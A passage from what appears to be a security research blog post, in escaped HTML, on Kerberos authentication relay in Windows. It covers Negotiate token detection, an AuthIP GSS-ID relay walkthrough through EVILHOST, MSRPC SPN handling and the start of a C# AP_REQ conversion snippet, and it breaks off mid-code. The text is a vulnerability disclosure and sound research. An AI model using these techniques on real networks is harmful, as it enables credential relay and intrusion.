class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This isn&amp;#39;t a problem as the server implementation of &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;will pass the input token to the function &lt;/span&gt;&lt;span class="c4"&gt;NegpDetermineTokenPackage&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c4"&gt;lsasrv.dll&lt;/span&gt;&lt;span&gt;&amp;nbsp;during the first call to &lt;/span&gt;&lt;span class="c4"&gt;AcceptSecurityContext&lt;/span&gt;&lt;span&gt;. This function detects if the client has passed a GSS-API Kerberos token (or NTLM) and enables a pass through mode where &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;gets out of the way. Therefore even if the client uses the &lt;/span&gt;&lt;span class="c4"&gt;Kerberos &lt;/span&gt;&lt;span class="c3"&gt;package you can still authenticate to the server and keep the client happy without having to extract the inner authentication token or wrap up response tokens.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One actual issue for relaying is the &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;protocol enables integrity protection (equivalent to passing &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_INTEGRITY&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the underlying package) so that it can generate a &lt;/span&gt;&lt;span class="c4"&gt;Message Integrity Code (MIC)&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the authentication exchange to prevent tampering. Using the &lt;/span&gt;&lt;span class="c4"&gt;Kerberos &lt;/span&gt;&lt;span&gt;package directly won&amp;#39;t add integrity protection automatically. Therefore relaying Kerberos AP_REQs from &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;will likely hit issues related to automatic enabling of signing on the server. It is possible for a client to explicitly disable automatic integrity checking by passing the &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_NO_INTEGRITY&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;request attribute, but that&amp;#39;s not a common case.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;It&amp;#39;s possible to disable &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;from the relay if the client passes an arbitrary authentication token to the first call of the &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. On the first call the &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation will call the &lt;/span&gt;&lt;span class="c4"&gt;NegpDetermineTokenPackage&lt;/span&gt;&lt;span&gt;&amp;nbsp;function to determine whether to enable authentication pass through. If the initial token is NTLM or looks like a Kerberos token then it&amp;#39;ll pass through directly to the underlying security package and it won&amp;#39;t set &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_INTEGRITY&lt;/span&gt;&lt;span&gt;, unless the client explicitly requested it. The byte sequence [0x00, 0x01, 0x40] is sufficient to get &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span class="c3"&gt;to detect Kerberos, and the token is then discarded so it doesn&amp;#39;t have to contain any further valid data.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.tx92zzdoh7eu"&gt;&lt;span class="c6 c19"&gt;Sniffing and Proxying Traffic&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Before going into individual protocols that I&amp;#39;ve researched, it&amp;#39;s worth discussing some more obvious ways of getting access to Kerberos authentication targeted at other services. First is sniffing network traffic sent from client to the server. For example, if the Kerberos AP_REQ is sent to a service over an unencrypted network protocol and the attacker can view that traffic the AP_REQ could be extracted and relayed. The selection of the SPN will be based on the expected traffic so the attacker doesn&amp;#39;t need to do anything to influence it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The Kerberos authentication protocol has protections against this attack vector. The Kerberos AP_REQ doesn&amp;#39;t just contain the service ticket, it&amp;#39;s also accompanied by an &lt;/span&gt;&lt;span class="c4"&gt;Authenticator&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;which is encrypted using the ticket&amp;#39;s session key. This key is accessible by both the legitimate client and the service. The authenticator contains a timestamp of when it was generated, and the service can check if this authenticator is within an allowable time range and whether it has seen the timestamp already. This allows the service to reject replayed authenticators by caching recently received values, and the allowable time window prevents the attacker waiting for any cache to expire before replaying.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;What this means is that while an attacker could sniff the Kerberos authentication on the wire and relay it, if the service has already received the authenticator it would be rejected as being a replay. The only way to exploit it would be to somehow prevent the legitimate authentication request from reaching the service, or race the request so that the attacker&amp;#39;s packet is processed first.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;Note, &lt;/span&gt;&lt;span class="c8 c4"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4120#section-3.2.3"&gt;RFC4120&lt;/a&gt;&lt;/span&gt;&lt;span class="c25 c14 c4"&gt;&amp;nbsp;mentions the possibility of embedding the client&amp;#39;s network address in the authenticator so that the service could reject authentication coming from the wrong host. This isn&amp;#39;t used by the Windows Kerberos implementation as far as I can tell. No doubt it would cause too many false positives for the replay protection in anything but the simplest enterprise networks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Therefore the only reliable way to exploit this scenario would be to actively interpose on the network communications between the client and service. This is of course practical and has been demonstrated many times assuming the traffic isn&amp;#39;t protected using something like TLS with server verification. Various attacks would be possible such as ARP or DNS spoofing attacks or HTTP proxy redirection to perform the &lt;/span&gt;&lt;span&gt;interposition&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;of the traffic.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;However, active MitM of protocols is a known risk and therefore an enterprise might have technical defenses in place to mitigate the issue. Of course, if such enterprises have enabled all the recommended relay protections,it&amp;#39;s a moot point. Regardless, we&amp;#39;ll assume that MitM is impractical for existing services due to protections in place and consider how individual protocols handle SPN selection.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.jst25c8kuijh"&gt;&lt;span class="c6 c19"&gt;IPSec and AuthIP&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;My research into Kerberos authentication relay came about in part because I was looking into the implementation of IPSec on Windows as part of my firewall research. Specifically I was researching the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-aips/eee3de64-3847-4451-978e-9513ff187d30"&gt;AuthIP ISAKMP&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;which allows for Windows authentication protocols to be used to establish IPsec Security Associations. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;I noticed that the AuthIP protocol has a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-aips/9ab1ccc0-d92e-4ca4-bae9-1c93871399ac"&gt;GSS-ID payload&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which can be sent from the server to the client. This payload contains the textual SPN to use for the Kerberos authentication during the AuthIP process. This SPN is passed verbatim to the SSPI &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;call by the AuthIP client.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;As no verification is done on the format of the SPN in the GSS-ID payload, it allows the attacker to fully control the values including the service class and instance name. Therefore if an attacker can induce a domain joined machine to connect to an attacker controlled service and negotiate AuthIP then a Kerberos AP_REQ for an arbitrary SPN can be captured for relay use. As this AP_REQ is never sent to the target of the SPN it will not be detected as a replay.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Inducing authentication isn&amp;#39;t necessarily difficult. Any IP traffic which is covered by the domain &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/configure-the-rules-to-require-encryption"&gt;configured security connection rules&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;will attempt to perform AuthIP. For example it&amp;#39;s possible that a UDP response for a DNS request from the domain controller might be sufficient. AuthIP supports two authenticated users, the machine and the calling user. By default it seems the machine authenticates first, so if you convinced a Domain Controller to authenticate you&amp;#39;d get the DC computer account which c&lt;/span&gt;&lt;span&gt;ould be fairly exploitable.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;For interest&amp;#39;s sake, the SPN is also used to determine the computer account associated with the server. This computer account is then used with &lt;/span&gt;&lt;span class="c8 c4"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94"&gt;Service For User (S4U)&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;to generate a local access token allowing the client to determine the identity of the server. However I don&amp;#39;t think this is that useful as the fake server can&amp;#39;t complete the authentication and the connection will be discarded.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The security connection rules use IP address ranges to determine what hosts need IPsec authentication. If these address ranges are too broad it&amp;#39;s also possible that ISAKMP AuthIP traffic might leak to external networks. For example if the rules don&amp;#39;t limit the network ranges to the enterprise&amp;#39;s addresses, then even a connection out to a public service could be accompanied by the ISAKMP AuthIP packet. This can be then exploited by an attacker who is not co-located on the enterprise network just by getting a client to connect to their server, such as through a web URL.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEiDuaDAyi9I9zQlGa5gBZnE1I_KIMDq-jtVM1kni1B7whSMYuGvC2xaQA75T9cjmVkuBzkHxQxWbN3hiEWaEeJ-Ci1aGxReamFMy83glKslnxT_evjrIy7SZl-yMvg3OgdamPqIttMyXw7kzSKjnbyny3qcrUSQFANJCH55j_FaeOaFFnsROkTr8ABomw=s835" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEiDuaDAyi9I9zQlGa5gBZnE1I_KIMDq-jtVM1kni1B7whSMYuGvC2xaQA75T9cjmVkuBzkHxQxWbN3hiEWaEeJ-Ci1aGxReamFMy83glKslnxT_evjrIy7SZl-yMvg3OgdamPqIttMyXw7kzSKjnbyny3qcrUSQFANJCH55j_FaeOaFFnsROkTr8ABomw=s835" border="0" alt="Diagram of a relay using a fake AuthIP server" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;To summarize the attack process from the diagram:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c24 lst-kix_d25vxsk234hv-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;Induce a client computer to send some network traffic to &lt;/span&gt;&lt;span class="c4"&gt;EVILHOST&lt;/span&gt;&lt;span&gt;. It doesn&amp;#39;t really matter what the traffic is, only that the IP address, type and port must match an IP security connection rule to use AuthIP. &lt;/span&gt;&lt;span class="c4"&gt;EVILHOST &lt;/span&gt;&lt;span class="c3"&gt;does not need to be domain joined to perform the attack.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;The network traffic will get the Windows IPsec client to try and establish a security association with the target host.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;A fake AuthIP server on the target host receives the request to establish a security association and returns a GSS-ID payload. This payload contains the target SPN, for example &lt;/span&gt;&lt;span class="c4"&gt;CIFS/FILESERVER&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;The IPsec client uses the SPN to create an AP_REQ token and sends it to &lt;/span&gt;&lt;span class="c4"&gt;EVILHOST&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c4"&gt;EVILHOST&lt;/span&gt;&lt;span&gt;&amp;nbsp;relays the Kerberos AP_REQ to the target service on &lt;/span&gt;&lt;span class="c4"&gt;FILESERVER&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Relaying this AuthIP authentication isn&amp;#39;t ideal from an attacker&amp;#39;s perspective. As the authentication will be used to sign and seal the network traffic, the request context flags for the call to &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;will require integrity and confidentiality protection. For network protocols such as LDAP which default to requiring signing and sealing if the client supports it, this would prevent the relay attack from working. However if the service ignores the protection and doesn&amp;#39;t have any further checks in place this would be sufficient. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This issue was &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2213"&gt;reported to MSRC&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and assigned case number 66900. However Microsoft have indicated that it will not be fixed with a security bulletin. &lt;/span&gt;&lt;span&gt;I&amp;#39;ve described Microsoft&amp;#39;s rationale for not fixing this issue later in the blog post&lt;/span&gt;&lt;span&gt;. If you want to reproduce this issue there&amp;#39;s details on Project Zero&amp;#39;s &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2213"&gt;issue tracker&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.27tuyymck8fh"&gt;&lt;span class="c6 c19"&gt;MSRPC&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;After discovering that AuthIP could allow for authentication relay the next protocol I looked at is &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page"&gt;MSRPC&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The protocol supports &lt;/span&gt;&lt;span class="c4"&gt;NTLM&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;authentication protocols over connected network transports such as named pipes or TCP. These authentication protocols need to be opted into by the server using the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterauthinfo"&gt;RpcServerRegisterAuthInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API by specifying the authentication service constants of &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_WINNT&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_NEGOTIATE&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;respectively. When registering the authentication information the server can optionally specify the SPN that needs to be used by the client.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;However, this SPN isn&amp;#39;t actually used by the RPC server itself. Instead it&amp;#39;s registered with the runtime, and a client can query the server&amp;#39;s SPN using the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtinqserverprincname"&gt;RpcMgmtInqServerPrincName &lt;/a&gt;&lt;/span&gt;&lt;span&gt;management API. Once the SPN is queried the client can configure its authentication for the connection using the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo"&gt;RpcBindingSetAuthInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. However, this isn&amp;#39;t required; the client could just generate the SPN manually and set it. If the client doesn&amp;#39;t call &lt;/span&gt;&lt;span class="c4"&gt;RpcBindingSetAuthInfo&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;then it will not perform any authentication on the RPC connection.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;Aside, curiously when a connection is made to the server it can query the client&amp;#39;s authentication information using the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindinginqauthclient"&gt;RpcBindingInqAuthClient&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;API. However, the SPN that this API returns is the one registered by RpcServerRegisterAuthInfo and NOT the one which was used by the client to authenticate. Also Microsoft does mention the call to RpcMgmtInqServerPrincName in the &amp;quot;&lt;/span&gt;&lt;span class="c8 c4"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/rpc/choosing-security-qos-options"&gt;Writing a secure RPC client or server&lt;/a&gt;&lt;/span&gt;&lt;span class="c25 c14 c4"&gt;&amp;quot; section on MSDN. However they frame it in the context of mutual authentication and not to protect against a relay attack.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;If a client queries for the SPN from a malicious RPC server it will authenticate using a Kerberos AP_REQ for an SPN fully under the attacker&amp;#39;s control. Whether the AP_REQ has integrity or confidentiality enabled depends on the authentication level set during the call to &lt;/span&gt;&lt;span class="c4"&gt;RpcBindingSetAuthInfo&lt;/span&gt;&lt;span&gt;. If this is set to &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the client uses &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span&gt;&amp;nbsp;then the AP_REQ won&amp;#39;t have integrity enabled. However, if &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;is used or anything above &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_CONNECT&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;as a level is used then it will have the integrity/confidentiality flags set.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Doing a quick scan in &lt;/span&gt;&lt;span class="c4"&gt;system32 &lt;/span&gt;&lt;span&gt;the following DLLs call the &lt;/span&gt;&lt;span class="c4"&gt;RpcMgmtInqServerPrincName&lt;/span&gt;&lt;span&gt;&amp;nbsp;API: &lt;/span&gt;&lt;span class="c4"&gt;certcli.dll, dot3api.dll, dusmsvc.dll, FrameServerClient.dll, L2SecHC.dll, luiapi.dll, msdtcprx.dll, nlaapi.dll, ntfrsapi.dll, w32time.dll, WcnApi.dll, WcnEapAuthProxy.dll, WcnEapPeerProxy.dll, witnesswmiv2provider.dll, wlanapi.dll, wlanext.exe, WLanHC.dll, wlanmsm.dll, wlansvc.dll, wwansvc.dll, wwapi.dll. &lt;/span&gt;&lt;span&gt;Some basic analysis shows that none of these clients check the value of the SPN and use it verbatim with &lt;/span&gt;&lt;span class="c4"&gt;RpcBindingSetAuthInfo&lt;/span&gt;&lt;span&gt;. That said, they all seem to use &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_NEGOTIATE&lt;/span&gt;&lt;span&gt;&amp;nbsp;and set the authentication level to &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_PRIVACY&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;which makes them less useful as an attack vector.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;If the client specifies &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_NEGOTIATE&lt;/span&gt;&lt;span&gt;&amp;nbsp;but does not specify an SPN then the runtime generates one automatically. This is based on the target hostname with the &lt;/span&gt;&lt;span class="c4"&gt;RestrictedKrbHost &lt;/span&gt;&lt;span&gt;service class. The runtime doesn&amp;#39;t process the hostname, it just concatenates strings and for some reason the runtime doesn&amp;#39;t support generating the SPN for &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One additional quirk of the RPC runtime is that the request attribute flag &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_USE_DCE_STYLE&lt;/span&gt;&lt;span&gt;&amp;nbsp;is used when calling &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;. This enables a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/190ab8de-dc42-49cf-bf1b-ea5705b7a087"&gt;special three-leg authentication mode&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;which results in the server sending back an AP_RET and then receiving another AP_RET from the client. Until that third AP_RET has been provided to the server it won&amp;#39;t consider the authentication complete so it&amp;#39;s not sufficient to just forward the initial AP_REQ token and close the connection to the client. This just makes the relay code slightly more complex but not impossible.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;A second change that &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_USE_DCE_STYLE&lt;/span&gt;&lt;span&gt;&amp;nbsp;introduces is that the Kerberos AP_REQ token does not have an GSS-API wrapper. This causes the call to &lt;/span&gt;&lt;span class="c4"&gt;NegpDetermineTokenPackage&lt;/span&gt;&lt;span&gt;&amp;nbsp;to fail to detect the package in use, making it impossible to directly forward the traffic to a server using the &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;package. However, this prefix is not protected against modification so the relay code can append the appropriate value before forwarding to the server. For example the following C# code can be used to convert a DCE style AP_REQ to a GSS-API format which &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span class="c3"&gt;will accept.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3c51830e72fcb7113b1dc4666718252f7b0b751f"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;public&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;static&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c2"&gt;[] EncodeLength(&lt;/span&gt;&lt;span class="c2 c13"&gt;int&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;length)&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;if&lt;/span&gt;&lt;span class="c2 c6"&gt;&amp;nbsp;(length &amp;lt; 0x80)&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;return&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c2"&gt;[] { (&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c6 c2"&gt;)length };&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;if&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;(length &amp;lt; 0x100)&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;return&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c2"&gt;[] { 0x81, (&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c6 c2"&gt;)length };&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;if&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;(length &amp;lt; 0x10000)&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;return&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c2"&gt;[] { 0x82, (&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c6 c2"&gt;)(length &amp;gt;&amp;gt; 8), &lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span 